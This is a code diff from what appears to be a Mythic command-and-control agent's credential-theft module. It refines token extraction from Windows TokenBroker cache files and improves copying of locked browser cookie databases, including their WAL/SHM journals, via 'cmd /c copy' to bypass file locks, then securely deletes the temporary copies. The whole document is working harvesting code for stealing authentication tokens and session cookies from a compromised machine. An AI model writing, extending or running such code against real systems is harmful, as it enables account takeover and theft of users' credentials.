@@ -81,12 +81,17 @@ func credTokenBroker(sb *strings.Builder) []structs.MythicCredential {
 
 	var creds []structs.MythicCredential
 	tokenCount := 0
+	skippedCount := 0 // non-TokenResponse or no ResponseBytes
 	errorCount := 0
 
 	for _, f := range files {
 		tokens, parseErr := parseTbresFile(f)
 		if parseErr != nil {
 			errorCount++
+			continue
+		}
+		if tokens == nil {
+			skippedCount++ // not TokenResponse or no ResponseBytes
 			continue
 		}
 		for _, t := range tokens {
@@ -139,7 +144,7 @@ func credTokenBroker(sb *strings.Builder) []structs.MythicCredential {
 		}
 	}
 
-	sb.WriteString(fmt.Sprintf("  Extracted %d tokens (%d files failed to parse)\n\n", tokenCount, errorCount))
+	sb.WriteString(fmt.Sprintf("  Extracted %d tokens (%d metadata/skipped, %d errors)\n\n", tokenCount, skippedCount, errorCount))
 	return creds
 }
 
@@ -384,6 +389,7 @@ func extractProfileCookies(sb *strings.Builder, appName, profile, cookiesPath st
 
 // openDBViaCmdCopy tries to open a locked SQLite DB by copying with cmd /c copy.
 // This uses a different code path than Go's CreateFileW and can sometimes bypass locks.
+// Also copies WAL/SHM journals for WAL-mode databases.
 func openDBViaCmdCopy(dbPath string) (*sql.DB, func(), error) {
 	tf, err := os.CreateTemp("", "ewcookies-*.db")
 	if err != nil {
@@ -398,15 +404,32 @@ func openDBViaCmdCopy(dbPath string) (*sql.DB, func(), error) {
 		return nil, func() {}, fmt.Errorf("DB locked by process (copy failed: %v)", cmdErr)
 	}
 
+	// Also copy WAL and SHM journals if they exist — required for WAL-mode databases
+	execCmdTimeout("cmd", "/c", "copy", "/y", dbPath+"-wal", tmpFile+"-wal") //nolint:errcheck
+	execCmdTimeout("cmd", "/c", "copy", "/y", dbPath+"-shm", tmpFile+"-shm") //nolint:errcheck
+
 	db, err := sql.Open("sqlite", tmpFile)
 	if err != nil {
 		secureRemove(tmpFile)
+		secureRemove(tmpFile + "-wal")
+		secureRemove(tmpFile + "-shm")
 		return nil, func() {}, err
+	}
+
+	// Verify the DB is actually usable
+	if pingErr := db.Ping(); pingErr != nil {
+		db.Close()
+		secureRemove(tmpFile)
+		secureRemove(tmpFile + "-wal")
+		secureRemove(tmpFile + "-shm")
+		return nil, func() {}, fmt.Errorf("DB copy unusable: %w", pingErr)
 	}
 
 	cleanup := func() {
 		db.Close()
 		secureRemove(tmpFile)
+		secureRemove(tmpFile + "-wal")
+		secureRemove(tmpFile + "-shm")
 	}
 	return db, cleanup, nil
 }
